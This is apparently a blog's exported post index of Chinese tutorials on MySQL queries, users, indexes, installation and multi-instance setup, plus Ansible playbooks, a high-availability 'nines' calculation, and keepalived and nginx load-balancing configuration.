Sdept varchar(16) default null comment ‘学生所在系别’, primary key (Sno), key index_Sname (Sname) ) ; 课程表： create table course( Cno int(10) NOT NULL COMMENT ‘课程号’, Cname varchar(64) NOT NULL COMMENT ‘课程名’, Ccredit tinyint(2) NOT NULL COMMENT ‘学分’, PRIMARY KEY (Cno) ) ; 选课表： create table SC ( SCid int(12) not null auto_increment comment ‘主键’, Sno int(10) not null comment ‘学号’, Cno int(10) not null comment ‘课程号’, Grade tinyint(2) not null comment ‘学生成绩’, primary key (SCid) ); 学生表插入数据： insert into student values(0001,‘小明’,‘男’,18,‘计算机科学与技术’); insert into student values(0002,‘小红’,‘女’,25,‘管理学’); insert into student values(0003,‘小粉’,‘女’,28,‘会计’); insert into student values(0004,‘小紫’,‘女’,35,‘网络工程’); insert into student values(0005,‘小绿’,‘男’,28,‘工商管理’); insert into student values(0006,‘小蓝’,‘男’,21,‘物流管理’); 课程表插入数据： insert into course values(1001,‘云计算’,1); insert into course values(1002,‘python’,1); insert into course values(1003,‘java’,1); insert into course values(1004,‘网络工程’,1); insert into course values(1005,‘大保健’,6); 选课表插入数据： insert into sc (Sno,Cno,Grade) values (0001,1001,4); insert into sc (Sno,Cno,Grade) values (0001,1002,3); insert into sc (Sno,Cno,Grade) values (0001,1003,1); insert into sc (Sno,Cno,Grade) values (0001,1004,6); insert into sc (Sno,Cno,Grade) values (0002,1001,3); insert into sc (Sno,Cno,Grade) values (0002,1002,2); insert into sc (Sno,Cno,Grade) values (0002,1003,2); insert into sc (Sno,Cno,Grade) values (0002,1004,8); insert into sc (Sno,Cno,Grade) values (0003,1001,4); insert into sc (Sno,Cno,Grade) values (0003,1002,4); insert into sc (Sno,Cno,Grade) values (0003,1003,2); insert into sc (Sno,Cno,Grade) values (0003,1004,8); insert into sc (Sno,Cno,Grade) values (0004,1001,1); insert into sc (Sno,Cno,Grade) values (0004,1002,1); insert into sc (Sno,Cno,Grade) values (0004,1003,2); insert into sc (Sno,Cno,Grade) values (0004,1004,3); insert into sc (Sno,Cno,Grade) values (0005,1001,5); insert into sc (Sno,Cno,Grade) values (0005,1002,3); insert into sc (Sno,Cno,Grade) values (0005,1003,2); insert into sc (Sno,Cno,Grade) values (0005,1005,9); 查询所有学生所选的课程与对应的成绩： mysql\u003e select student.Sno,student.Sname,student.Sage,course.Cname,sc.Grade from student,course,sc where student.Sno=sc.sno and course.Cno=sc.Cno order by Sno asc; +—–+——–+——+————–+——-+ | Sno | Sname | Sage | Cname | Grade | +—–+——–+——+————–+——-+ | 1 | 小明 | 18 | 云计算 | 4 | | 1 | 小明 | 18 | python | 3 | | 1 | 小明 | 18 | java | 1 | | 1 | 小明 | 18 | 网络工程 | 6 | | 2 | 小红 | 25 | 云计算 | 3 | | 2 | 小红 | 25 | python | 2 | | 2 | 小红 | 25 | java | 2 | | 2 | 小红 | 25 | 网络工程 | 8 | | 3 | 小粉 | 28 | 云计算 | 4 | | 3 | 小粉 | 28 | python | 4 | | 3 | 小粉 | 28 | java | 2 | | 3 | 小粉 | 28 | 网络工程 | 8 | | 4 | 小紫 | 35 | 云计算 | 1 | | 4 | 小紫 | 35 | python | 1 | | 4 | 小紫 | 35 | java | 2 | | 4 | 小紫 | 35 | 网络工程 | 3 | | 5 | 小绿 | 28 | 云计算 | 5 | | 5 | 小绿 | 28 | python | 3 | | 5 | 小绿 | 28 | java | 2 | | 5 | 小绿 | 28 | 大保健 | 9 | +—–+——–+——+————–+——-+ 20 rows in set (0.00 sec) 查看所有人的选课情况 mysql\u003e select student.Sno,student.Sname,course.Cname,course.Cno from student,course,sc where student.Sno=sc.Sno and course.Cno=sc.Cno order by Sno; +—–+——–+————–+——+ | Sno | Sname | Cname | Cno | +—–+——–+————–+——+ | 1 | 小明 | 云计算 | 1001 | | 1 | 小明 | python | 1002 | | 1 | 小明 | java | 1003 | | 1 | 小明 | 网络工程 | 1004 | | 2 | 小红 | 云计算 | 1001 | | 2 | 小红 | python | 1002 | | 2 | 小红 | java | 1003 | | 2 | 小红 | 网络工程 | 1004 | | 3 | 小粉 | 云计算 | 1001 | | 3 | 小粉 | python | 1002 | | 3 | 小粉 | java | 1003 | | 3 | 小粉 | 网络工程 | 1004 | | 4 | 小紫 | 云计算 | 1001 | | 4 | 小紫 | python | 1002 | | 4 | 小紫 | java | 1003 | | 4 | 小紫 | 网络工程 | 1004 | | 5 | 小绿 | 云计算 | 1001 | | 5 | 小绿 | python | 1002 | | 5 | 小绿 | java | 1003 | | 5 | 小绿 | 大保健 | 1005 | +—–+——–+————–+——+ 20 rows in set (0.00 sec) ","date":"2019-06-01 19:49","objectID":"/post/323/:0:0","tags":["mysql"],"title":"mysql-select多表连表查询(2)","uri":"/post/323/"},{"categories":["系统服务","databases"],"content":"简单查询 语法：select 字段,字段 from 表名; mysql\u003eselect id,name from test; 条件查询 查看前2行的数据 mysql\u003eselect id,name from test limit 2; 查看第1条到第3条数据(第一条是0，所以是0,3) mysql\u003eselect id,name from test limit 0,3; 按照指定内容查询(字符串内容需要加引号) mysql\u003eselect id,name from test where name=‘soulchild’; 多个条件查询(and、or、\u003e、\u003c、=) mysql\u003e select id,name from test where name=‘soulchild’ and id=1; 查询结果根据id列排序 asc：升序(默认) desc：降序 mysql\u003e select id,name from test order by id desc; ","date":"2019-06-01 19:47","objectID":"/post/319/:0:0","tags":["mysql"],"title":"mysql-select查询(1)","uri":"/post/319/"},{"categories":["系统服务","databases"],"content":"基础创建语句 1.创建一张test表 create table test( id int(4) not null auto_increment, name char(20) not null, primary key(id) ); 2.插入 方法1：插入多条数据在后面加逗号和括号即可 语法：insert into 表名(字段名,字段名) values(值,值),(值,值); mysql\u003einsert into test(id,name) values(1,‘soulchild’); 因为id字段是自增的，所以插入时不写id也可以 mysql\u003einsert into test(name) values('xiaoming'); mysql\u003e select * from test; +—-+———–+ | id | name | +—-+———–+ | 1 | soulchild | | 2 | xiaoming | +—-+———–+ 2 rows in set (0.00 sec) 方法2: 按照表结构顺序插入(多条数据在后面加逗号和括号即可) 语法：insert into 表名 values(值,值),(值,值); mysql\u003einsert into test values(3,‘xiaobai’); mysql\u003e select * from test; +—-+———–+ | id | name | +—-+———–+ | 1 | soulchild | | 2 | xiaoming | | 3 | xiaobai | +—-+———–+ 3 rows in set (0.00 sec) 插入多条数据举例：(推荐) mysql\u003e insert into test values(1,'soulchild'),(2,'xiaoming'),(3,'xiaobai'),(4,'xiaoli'),(5,'xiaohong');","date":"2019-06-01 19:41","objectID":"/post/310/:0:0","tags":["mysql"],"title":"mysql-insert插入","uri":"/post/310/"},{"categories":["系统服务","databases"],"content":"1.添加PRIMARY KEY（主键索引） 语法：ALTER TABLE 表名 ADD PRIMARY KEY ( 列名称 ) mysql\u003eALTER TABLE table_name ADD PRIMARY KEY ( column_name ) 添加自增属性的主键索引： 语法：alter table 表名 change 列名称 新的列名称 类型 primary key auto_increment; mysql\u003ealter table student change id id int primary key auto_increment; 删除： alter table student modify id int;(有自增时,需要先取消自增) alter table table_name drop primary key; 2.添加UNIQUE(唯一索引) 方法1： 语法：ALTER TABLE 表名 ADD UNIQUE ( 列名称) mysql\u003eALTER TABLE table_name ADD UNIQUE ( column_name) 方法2： 语法：create unique index 索引名 on 表名(列名); mysql\u003ecreate unique index uni_ind_name on student(name); 3.添加INDEX(普通索引) 语法：ALTER TABLE 表名 ADD INDEX index_name ( 列名称 ) mysql\u003eALTER TABLE table_name ADD INDEX index_name ( column_name ) 4.添加FULLTEXT(全文索引) 语法：ALTER TABLE 表名 ADD FULLTEXT ( 列名称) mysql\u003eALTER TABLE table_name ADD FULLTEXT ( column_name) 5.添加多列索引 方法1： 语法：ALTER TABLE 表名 ADD INDEX index_name ( 列名称, 列名称, 列名称 ) mysql\u003eALTER TABLE table_name ADD INDEX index_name ( column1_name, column2_name, column3_name ) 方法2： 语法：create index 索引名 on 表名称(列名称,列名称) mysql\u003ecreate index ind_name_dept on student(name,dept); 6.字段对应内容的前N个字符创建普通索引 语法：create index 索引名称 on 表名称 ( 列名称(N)) mysql\u003ecreate index index_name on table_name(column_name(8)); 删除索引： 方法1： 语法：drop index 索引名称 on 表名; mysql\u003edrop index ind_name_dept on student; 方法2： 语法：alter table 表名 drop index 索引名; mysql\u003ealter table student drop index index_name; ","date":"2019-06-01 19:39","objectID":"/post/306/:0:0","tags":["mysql"],"title":"mysql-添加删除索引","uri":"/post/306/"},{"categories":["系统服务","databases"],"content":"all privileges权限列表   SELECT==\u003e查询 INSERT==\u003e插入 UPDATE==\u003e更新 DELETE==\u003e删除库、表 CREATE==\u003e创建库、表 DROP==\u003e删除库、表 REFERENCES==\u003e INDEX==\u003e索引 ALTER==\u003e修改 CREATE TEMPORARY TABLES==\u003e创建临时表 LOCK TABLES==\u003e锁表 EXECUTE==\u003e执行 CREATE VIEW==\u003e创建视图 SHOW VIEW==\u003e查看视图 CREATE ROUTINE==\u003e创建存储过程 ALTER ROUTINE==\u003e修改存储过程 EVENT==\u003e事件 TRIGGER==\u003e触发器 ","date":"2019-06-01 19:36","objectID":"/post/302/:0:0","tags":["mysql"],"title":"mysql  all privileges权限","uri":"/post/302/"},{"categories":["系统服务","databases"],"content":"数据查询语言(DQL) select：查询 where：条件 order by:排序 desc：倒序 asc：正序 group by having 。。。 数据操作语言(DML) 一般用于处理表中的数据 insert：插入 update：修改 delete：删除 delete from mysql.user where user=‘test’;(删除mysql库user表中，user字段内容为test的记录) 。。。 事务处理语言(TPL) ※※※ DML语句执行完后，将影响的内容更新到数据库中 commit rollback 。。。 数据控制语言(DCL) ※※※ 如授权等操作 grant：设置权限 revoke：收回权限 。。。 数据定义语言(DDL) ※※※ create：创建库、表 drop：删除库、表 alter：修改 。。。 指针控制语言(CCL) 略 ","date":"2019-06-01 19:36","objectID":"/post/300/:0:0","tags":["mysql"],"title":"mysql基础sql语句(1)","uri":"/post/300/"},{"categories":["系统服务","databases"],"content":"创建不同编码的数据库 utf8： create database soulchild_utf8 default character set utf8 collate utf8_chinese_ci; gbk： create database soulchild_gbk default character set gbk collate gbk_chinese_ci; 查看所有数据库： show databases; 根据条件查找数据库： show databases like ‘soulchild%’; 查看当前数据库的表： show tables; 查询mysql库中user表的，user、host字段select user ,host from mysql.user; 查看指定数据库的表： show tables in xxx; show tables like ‘xxx’; show tables from xxx; 查看当前所在数据库： select database(); 查看数据库版本： select version(); 查看当前用户： select user(); 查看当前时间： select now(); 删除数据库： drop database soulchild; 进入数据库： use soulchild; 删除用户: 方法1. drop user ‘soulchild’@’localhost’; flush privileges; 方法2. delete from mysql.user where user=‘soulchild’ and host=‘localhost’; flush privileges; 创建用户 方法1.(创建soulchild用户，允许10.0.0网段访问，密码为123) create user soulchild@'10.0.0.%' identified by '123'; flush privileges; 方法2.(创建soulchild用户，对db1库拥有所有权限，允许localhost访问，密码为123) grant all on db1.* to 'soulchild'@'localhost' identified by '123' flush privileges; 查看用户权限 show grants for soulchild@'localhost'; 收回权限 revoke delete on wordpress.* from 'soulchild'@'10.0.0.%'; 修改用户密码方法1. alter user soulchild@‘10.0.0.%’ identified by ‘456’; 方法2. update mysql.user set password=password('456') where user='soulchild'; 建表 #字段名 类型 是否为空 default默认值 create table student( id int(4) not null, name char(20) not null, age tinyint(2) not null default '0', dept varchar(16) default null ); 清空一张表 truncate table test; ","date":"2019-06-01 19:34","objectID":"/post/296/:0:0","tags":["mysql"],"title":"mysql基础sql语句(2)","uri":"/post/296/"},{"categories":["系统服务","databases"],"content":"停止单实例进程 pkill mysqld 创建目录结构 [root@db01 ~]# tree /data/ /data/ ├── 3306 │ ├── data │ ├── my.cnf │ └── mysql └── 3307 ├── data ├── my.cnf └── mysql my.cnf配置文件内容 [client] port = 3306 socket = /data/3306/mysql.sock [mysql] no-auto-rehash [mysqld] user = mysql port = 3306 socket = /data/3306/mysql.sock basedir = /application/mysql datadir = /data/3306/data open_files_limit = 1024 back_log =600 max_connections = 800 max_connect_errors = 3000 table_cache = 614 external-locking = FALSE max_allowed_packet = 8M sort_buffer_size = 1M join_buffer_size = 1M thread_cache_size = 100 thread_concurrency = 2 query_cache_size = 2M query_cache_limit = 1M query_cache_min_res_unit = 2K #default_table_type = InnoDB thread_stack = 192K #transaction_isolation = READ-COMMITTED tmp_table_size = 2M max_heap_table_size = 2M long_query_time = 1 pid-file = /data/3306/mysql.pid relay-log = /data/3306/relay-bin relay-log-info-file = /data/3306/relay-log.info binlog_cache_size = 1M max_binlog_cache_size = 1M max_binlog_size = 2M key_buffer_size = 16M read_buffer_size = 1M read_rnd_buffer_size = 1M bulk_insert_buffer_size = 1M lower_case_table_names = 1 skip-name-resolve slave-skip-errors = 1032,1062 replicate-ignore-db = mysql server-id = 1 innodb_additional_mem_pool_size = 4M innodb_buffer_pool_size = 32M innodb_data_file_path = ibdata1:128M:autoextend innodb_file_io_threads = 4 innodb_thread_concurrency = 8 innodb_flush_log_at_trx_commit = 2 innodb_log_buffer_size = 2M innodb_log_file_size = 4M innodb_log_files_in_group = 3 innodb_max_dirty_pages_pct = 90 innodb_lock_wait_timeout = 120 innodb_file_per_table = 0 [mysqldump] quick max_allowed_packet = 2M [mysqld_safe] log-error = /data/3306/mysql_3306.err pid-file = /data/3306/mysqld.pid mysql启动脚本 #!/bin/sh #init port=3306 mysql_user=“root” mysql_pwd=“wenmeng” CmdPath=\"/application/mysql/bin\" mysql_sock=\"/data/${port}/mysql.sock\" #startup function function_start_mysql() { if [ ! -e “$mysql_sock” ];then printf “Starting MySQL…\\n” /bin/sh ${CmdPath}/mysqld_safe –defaults-file=/data/${port}/my.cnf 2\u003e\u00261 \u003e /dev/null \u0026 else printf “MySQL is running…\\n” exit fi } #stop function function_stop_mysql() { if [ ! -e “$mysql_sock” ];then printf “MySQL is stopped…\\n” exit else printf “Stoping MySQL…\\n” ${CmdPath}/mysqladmin -u ${mysql_user} -p${mysql_pwd} -S /data/${port}/mysql.sock shutdown fi } #restart function function_restart_mysql() { printf “Restarting MySQL…\\n” function_stop_mysql sleep 2 function_start_mysql } case $1 in start) function_start_mysql ;; stop) function_stop_mysql ;; restart) function_restart_mysql ;; *) printf “Usage: /data/${port}/mysql {start|stop|restart}\\n” esac 配置文件：需要修改文件中的端口号和server-id 启动脚本：需要修改文件中的端口号，管理用户和密码 修改目录管理权限 chown -R mysql.mysql /data 添加启动脚本执行权限 find /data/ -type f -name mysql | xargs chmod +x 初始化数据库 /application/mysql/scripts/mysql_install_db –basedir=/application/mysql –datadir=/data/3306/data –user=mysql /application/mysql/scripts/mysql_install_db –basedir=/application/mysql –datadir=/data/3307/data –user=mysql 启动数据库 /data/3306/mysql start /data/3307/mysql start ","date":"2019-06-01 19:32","objectID":"/post/293/:0:0","tags":["mysql"],"title":"mysql5.5.32配置多实例","uri":"/post/293/"},{"categories":["系统服务","databases"],"content":"mysql5.5.32源码包下载地址： https://cdn.mysql.com/archives/mysql-5.5/mysql-5.5.32.tar.gz 1.安装依赖包 yum install -y cmake ncurses-devel 2.创建用户、组 groupadd mysql useradd mysql -s /sbin/nologin -M -g mysql 3.解压mysql tar xf mysql-5.5.32.tar.gz cd mysql-5.5.32 4.编译 cmake . -DCMAKE_INSTALL_PREFIX=/application/mysql-5.5.32 \\ -DMYSQL_DATADIR=/application/mysql-5.5.32/data \\ -DMYSQL_UNIX_ADDR=/application/mysql-5.5.32/tmp/mysql.sock \\ -DDEFAULT_CHARSET=utf8 \\ -DDEFAULT_COLLATION=utf8_general_ci \\ -DEXTRA_CHARSET=gbk,gb2312,utf8,ascii \\ -DENABLED_LOCAL_INFILE=on \\ -DWITH_INNOBASE_STORAGE_ENGINE=1 \\ -DWITH_FEDERATED_STORAGE_ENGINE=1 \\ -DWITH_BLACKHOLE_STORAGE_ENGINE=1 \\ -DWITHOUT_EXAMPL_ESTORAGE_ENGINE=1 \\ -DWITHOUT_PARTITION_ESTORAGE_ENGINE=1 \\ -DWITH_FAST_MUTEXES=1 \\ -DWITH_ZLIB=bundled \\ -DENABLED_LOCAL_INFILE=1 \\ -DWITH_READLINE=1 \\ -DWITH_ENBEDDED_SERVER=1 \\ -DWITH_DEBUG=0 5.安装 make \u0026\u0026 make install 6.创建软链接 ln –s /application/mysql-5.5.32/ /application/mysql 7.复制配置文件 cp /application/mysql/support-files/my-small.cnf /etc/my.cnf 8.配置环境变量 echo ’export PATH=/application/mysql/bin:$PATH’ \u003e\u003e /etc/profile source /etc/profile 9.初始化mysql chown -R mysql:mysql /application/mysql/data /application/mysql/scripts/mysql_install_db –user=mysql –basedir=/application/mysql –datadir=/application/mysql/data 10.创建启动脚本 cp /application/mysql/support-files/mysql.server /etc/init.d/mysqld chmod +x /etc/init.d/mysqld 11.启动服务并设置开机自启 service mysqld start chkconfig mysqld on 12.创建和更改密码 /application/mysql//bin/mysqladmin -u root password ’new-password' 或 /application/mysql//bin/mysqladmin -u root -h localhost password ’new-password' 13.删除mysql空用户 mysql\u003e delete from mysql.user where user=’'; 14.删除test库 mysql\u003e drop database test; ","date":"2019-06-01 19:29","objectID":"/post/286/:0:0","tags":["mysql"],"title":"mysql5.5.32源代码安装","uri":"/post/286/"},{"categories":["系统服务","databases"],"content":"跳过mysql的TCP/IP连接方式和验证模块 需要用到两个参数： –skip-grant-tables：跳过加载授权表（mysql.user） –skip-networking：跳过加载网络连接（关闭通过网络连接） (1)停数据库 systemctl stop mysqld (2)跳过授权表启动数据库 mysqld_safe –defaults-file=/etc/my.cnf –skip-grant-tables –skip-networking \u0026 (3)修改密码 [root@db01 mysql]mysql [(none)]\u003eflush privileges; [(none)]\u003egrant all on . to root@’localhost’ identified by ‘abc’ with grant option; [root@db01 mysql]# mysqladmin -uroot -pabc shutdown [root@db01 mysql]# systemctl start mysqld ","date":"2019-06-01 19:28","objectID":"/post/283/:0:0","tags":["mysql"],"title":"mysql忘记root密码解决方法","uri":"/post/283/"},{"categories":["系统服务","databases"],"content":"下载地址：https://cdn.mysql.com/archives/mysql-5.7/mysql-5.7.20-linux-glibc2.12-x86_64.tar 解压 tar xf mysql-5.7.20-linux-glibc2.12-x86_64.tar 删除无用压缩包 rm -rf mysql-5.7.20-linux-glibc2.12-x86_64.tar rm -rf mysql-test-5.7.20-linux-glibc2.12-x86_64.tar.gz 解压mysql tar zxvf mysql-5.7.20-linux-glibc2.12-x86_64.tar.gz 创建安装目录 mkdir -p /server/tools/ 将解压的mysql移动到安装目录 mv mysql-5.7.20-linux-glibc2.12-x86_64 /server/tools/mysql 添加环境变量，在文件末尾添加 vim /etc/profile export PATH=/server/tools/mysql/bin:$PATH 使配置生效 source /etc/profile 创建mysql用户 useradd mysql -M -s /sbin/nologin 创建mysql数据存放目录 mkdir -p /data/mysql 设置目录权限 chown -R mysql.mysql /server/tools/mysql chown -R mysql.mysql /data/mysql 安装依赖包 yum install -y libaio-devel 删除mariadb yum remove mariadb-libs 初始化数据（5.7以上版本） mysqld –initialize-insecure –user=mysql –basedir=/server/tools/mysql –datadir=/data/mysql (5.7以下版本)/server/tools/mysql/scripts/mysql_install_db –user=mysql –basedir=/server/tools/mysql –datadir=/data/mysql 参数说明： –initialize：开启安全策略 –initialize-insecure：关闭安全策略 安全策略： 1.密码长度:12位以上 2.密码复杂度 3.密码默认过期时间180天 4.初始化后会生成一个临时密码 –user：指定mysql用户 –basedir：mysql安装目录 –datadir：数据存放目录 创建修改my.cnf配置文件 [root@db01 ~]# cat /etc/my.cnf [mysqld] basedir=/application/mysql datadir=/data/mysql socket=/tmp/mysql.sock server_id=1 port=3306 [mysql] socket=/tmp/mysql.sock prompt=master-[\\\\d]\u003e [mysqld_safe] log-error=/var/log/mysql.log 添加启动脚本(centos6) cp /server/tools/mysql/support-files/mysql.server /etc/init.d/mysqld service mysqld start 使用systemd管理(centos7) vi /etc/systemd/system/mysqld.service [Unit] Description=MySQL Server Documentation=man:mysqld(8) Documentation=http://dev.mysql.com/doc/refman/en/using-systemd.html After=network.target After=syslog.target [Install] WantedBy=multi-user.target [Service] User=mysql Group=mysql ExecStart=/server/tools/mysql/bin/mysqld –defaults-file=/etc/my.cnf LimitNOFILE = 5000 ","date":"2019-06-01 18:51","objectID":"/post/266/:0:0","tags":["mysql"],"title":"centos7-mysql5.7.20免安装版配置初始化","uri":"/post/266/"},{"categories":["基础内容","ansible"],"content":"修改配置文件/etc/ansible/ansible.cfg 将37行的gathering修改为如下内容 gathering = explicit ","date":"2019-06-01 18:50","objectID":"/post/264/:0:0","tags":["ansible"],"title":"ansible使用剧本时卡死解决方法","uri":"/post/264/"},{"categories":["基础内容","ansible"],"content":"playbook配置项说明: --- - hosts: webservers # 执行任务的主机(all,组名称,ip...) vars: # 定义变量。引用方式：{{变量名}} http_port: 80 max_clients: 200 remote_user: root # 在远程主机上执行任务的用户 tasks: # 要执行的任务列表 - name: ensure apache is at the latest version # 任务名称(注释) yum: pkg=httpd state=latest # 指定yum模块，并写入相应模块的使用语法 - name: copy config file copy: src=./httpd.conf dest=/etc/httpd/conf/httpd.conf notify: restart apache # 触发handlers中定义的restart apache - name: ensure apache is running service: name=httpd state=started handlers: # 任务，与tasks不同的是只有在接受到通知时才会被触发 - name: restart apache service: name=httpd state=restarted ","date":"2019-06-01 18:38","objectID":"/post/256/:1:0","tags":[],"title":"ansible2.7.5编写简单剧本playbook","uri":"/post/256/"},{"categories":["基础内容","ansible"],"content":"使用剧本： ansible-playbook -C 02-cron.yml # 检查剧本，剧本中存在变量时检查会报错 ansible-playbook 02-cron.yml # 执行剧本 举例： --- - hosts: web tasks: - name: show hostname command: hostname --- - hosts: web tasks: - name: add cron cron: name=\"ansible test\" minute=10 job=\"ntedate time.windows.com \u003e/dev/null 2\u003e\u00261\" state=present ","date":"2019-06-01 18:38","objectID":"/post/256/:2:0","tags":[],"title":"ansible2.7.5编写简单剧本playbook","uri":"/post/256/"},{"categories":["基础内容","ansible"],"content":"register类型变量： --- - hosts: web tasks: - name: show ip address shell: hostname -I | awk '{print $2}' register: ip - name: print ip var to file shell: echo {{ip}} \u0026gt; /tmp/ip 上面的剧本首先执行查ip的命令，将执行结果通过register变量赋值给变量ip，然后在将变量ip中的内容追加到文件中。 执行结果如下： { stderr_lines: [], uchanged: True, uend: u2019-03-06 21:34:22.662536, failed: False, ustdout: u172.16.1.7, ucmd: uhostname -I | awk '{print }', urc: 0, ustart: u2019-03-06 21:34:22.651661, ustderr: u, udelta: u0:00:00.010875, stdout_lines: [u172.16.1.7] } 我们想要的结果是ip，其他的内容不需要，所以在调用变量得时候使用ip.stdout，即： --- - hosts: web tasks: - name: show ip address shell: hostname -I | awk '{print $2}' register: ip - name: print ip var to file shell: echo {{ip.stdout}} \u0026gt; /tmp/ip 在屏幕中显示剧本的执行结果： --- - hosts: web tasks: - name: show hostname command: hostname register: name - name: print hostname debug: msg={{name.stdout}} 这里用到debug模块,msg表示打印自定义消息，内容就是我们获取到结果的变量。 ","date":"2019-06-01 18:38","objectID":"/post/256/:2:1","tags":[],"title":"ansible2.7.5编写简单剧本playbook","uri":"/post/256/"},{"categories":["基础内容","ansible"],"content":"循环： --- - hosts: web tasks: - name: print loop debug debug: msg={{item}} with_items: - 1 - 2 - 3 ","date":"2019-06-01 18:38","objectID":"/post/256/:2:2","tags":[],"title":"ansible2.7.5编写简单剧本playbook","uri":"/post/256/"},{"categories":["基础内容","ansible"],"content":"判断: --- - hosts: all tasks: - name: yum install nfs-utils rpcbind yum: name=nfs-utils,rpcbind state=present when: ( ansible_hostname == \"nfs01\" ) or ( ansible_hostname == \"backup\" ) 只有主机名是nfs01或backup时安装nfs-utils rpcbind ansible_hostname等变量可以使用以下命令查询 ansilbe ip -m setup ","date":"2019-06-01 18:38","objectID":"/post/256/:2:3","tags":[],"title":"ansible2.7.5编写简单剧本playbook","uri":"/post/256/"},{"categories":["基础内容"],"content":"在软件系统的高可靠性（也称为可用性，英文描述为HA，High Available） 里有个衡量其可靠性的标准——X个9，这个X通常代表数字3~5。X个9表示在软件系统1年时间的使用过程中，系统可以正常使用时间与总时间（1年）之比， 我们通过下面的计算来感受下X个9在不同级别的可靠性差异。 1个9：(1-90%)*365=36.5天 表示该软件系统在连续运行1年时间里最多可能的业务中断时间是36.5天 2个9：(1-99%)*365=3.65天 表示该软件系统在连续运行1年时间里最多可能的业务中断时间是3.65天 3个9：(1-99.9%)36524=8.76小时 表示该软件系统在连续运行1年时间里最多可能的业务中断时间是8.76小时 4个9：(1-99.99%)36524=0.876小时=52.6分钟 表示该软件系统在连续运行1年时间里最多可能的业务中断时间是52.6分钟 5个9：(1-99.999%)36524*60=5.26分钟 表示该软件系统在连续运行1年时间里最多可能的业务中断时间是5.26分钟 6个9：(1-99.9999%)365246060=31秒 表示该软件系统在连续运行1年时间里最多可能的业务中断时间是31秒 ","date":"2019-06-01 18:37","objectID":"/post/254/:0:0","tags":[],"title":"6个9运维，系统的稳定可靠性","uri":"/post/254/"},{"categories":["系统服务"],"content":"高可用：实现自动切换主备服务器 实现方式： 一般服务器实现方式：keepalived、heartbeat 特殊服务器实现方式：mysql（MHA MMM）、Redis(主从、哨兵模式、集群) 部署keepalived服务: lb01 10.0.0.5 安装keepalived lb02 10.0.0.6 安装keepalived web01 web02 web03 # 安装keepalived(lb01，lb02) yum install -y keepalived # 配置文件说明===\u003e/etc/keepalived/keepalived.conf 全局配置global_defs 报警功能 — 可使用zabbix代替 高可用节点名称(lb01)： global_defs { router_id lb01 # 每台服务器名称不同,一般使用主机名即可 } VRRP配置（说明） 1、利用vrrp协议，实现多台高可用主机通讯 2、可以完成主备竞选机制，高可用集群中只有一个主服务器，可有多个备服务器 主服务器down后，恢复时会再次成为主服务器 3、选出主服务器后，由主服务器发送组播包信息 4、主服务器拥有vip地址，用户访问vip地址 ################################### 1.MASTER配置(lb01) global_defs { notification_email { 742899387@qq.com } notification_email_from keepalived@local.com smtp_server 192.168.200.1 smtp_connect_timeout 30 router_id keep-01 } # 定义一个状态检查,script中也可以写一个脚本，但脚本需有返回值 vrrp_script check_nginx { # 每2秒检查一次nginx进程状态，根据命令执行的状态码去判断服务是否正常 script \"/usr/bin/killall -0 nginx\" interval 2 # 2次状态吗为非0才为失败状态 fall 2 # 2次状态码为0才为正常状态 rise 2 } vrrp_instance nginx { # 设置为master state MASTER # 指定网卡 interface eth0 # vrrp标识1-255(需要和备节点一致) virtual_router_id 51 # 指定优先级，值越大优先级越高 priority 100 # 组播包间隔时间 advert_int 1 # 认证 authentication { auth_type PASS auth_pass 1111 } # 配置vip virtual_ipaddress { 10.0.0.3 } # 指定进入不同状态时要执行的脚本 #notify_master \"/server/scripts/keepalive/master.sh\" #notify_backup \"/server/scripts/keepalive/backup.sh\" #notify_fault \"/server/scripts/keepalive/fault.sh\" # 引用上面定义的状态检查 track_script { check_nginx } } 2.BACKUP配置(lb02) global_defs { notification_email { 742899387@qq.com } notification_email_from keepalived@local.com smtp_server 192.168.200.1 smtp_connect_timeout 30 router_id keep-02 } vrrp_script check_nginx { script \"/usr/bin/killall -0 nginx\" interval 2 fall 2 rise 2 } vrrp_instance nginx { state BACKUP interface eth0 virtual_router_id 51 priority 50 advert_int 1 authentication { auth_type PASS auth_pass 1111 } #notify_master \"/server/scripts/keepalive/master.sh\" #notify_backup \"/server/scripts/keepalive/backup.sh\" #notify_fault \"/server/scripts/keepalive/fault.sh\" virtual_ipaddress { 10.0.0.3 } track_script { check_nginx } } ","date":"2019-06-01 18:35","objectID":"/post/249/:0:0","tags":["keepalievd"],"title":"keepalived+nginx高可用服务部署","uri":"/post/249/"},{"categories":["系统服务"],"content":"配置官方源 vim /etc/yum.repos.d/nginx.repo [nginx-stable] name=nginx stable repo baseurl=http://nginx.org/packages/centos/$releasever/$basearch/ gpgcheck=1 enabled=1 gpgkey=https://nginx.org/keys/nginx_signing.key 安装 yum install -y nginx 查询配置文件等目录 rpm -ql nginx ","date":"2019-06-01 18:34","objectID":"/post/247/:0:0","tags":["nginx"],"title":"centos7-yum安装nginx","uri":"/post/247/"},{"categories":["系统服务"],"content":"web02配置（我的测试环境web01和web03也是一样的配置） [root@web02 conf.d]# cat /etc/nginx/conf.d/{bbs,www}.conf server { listen 80; server_name bbs.soulchild.cn; location / { root /html/bbs; index index.html; } } server { listen 80; server_name www.soulchild.cn; location / { root /html/www; index index.html; } } [root@web02 conf.d]# cat /html/{bbs,www}/index.html web02-10.0.0.8-bbs web02-10.0.0.8-www 负载均衡lb01配置 [root@lb01 ~]# cat /etc/nginx/conf.d/lb.conf server { listen 80; server_name localhost; location / { root /usr/share/nginx/html; index index.html index.htm; proxy_pass http://soulchild; proxy_set_header host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; } } upstream soulchild { server 10.0.0.7:80 backup; server 10.0.0.8:80 weight=7 max_fails=3 fail_timeout=20s; server 10.0.0.9:80 weight=3 max_fails=3 fail_timeout=20s; } upstream区块特殊指令和用法： upstream：定义集群信息 server：定义集群节点（可以使用以下参数） max_fails：连接失败，重试次数（默认1） fail_timeout：重新检查间隔时间(默认10s),失败指定次数(max_fails)后,间隔(fail_timeout)时间后,重试1次，失败则结束.(成功后下次检测还是3次机会) backup：热备，所有节点不能访问时，使用backup weight：设置轮询权重(分配比例) ip_hash：同一个用户访问，分配到同一台服务器，可以解决session问题 ","date":"2019-06-01 18:33","objectID":"/post/245/:0:0","tags":["nginx"],"title":"nginx实现负载均衡","uri":"/post/245/"},{"categories":["系统服务"],"content":"标记参数： last 停止当前这个请求，并根据重写后的规则，重新发起一个请求。 break 停止当前这个请求，在当前字段继续向下执行，但不会匹配其他location。 redirect 临时重定向302 permanent 永久重定向301 注* last和break重写后的地址不会显示在浏览器地址栏中 redirect和permanent重写后的地址会显示在浏览器的地址栏中 使用格式：rewrite 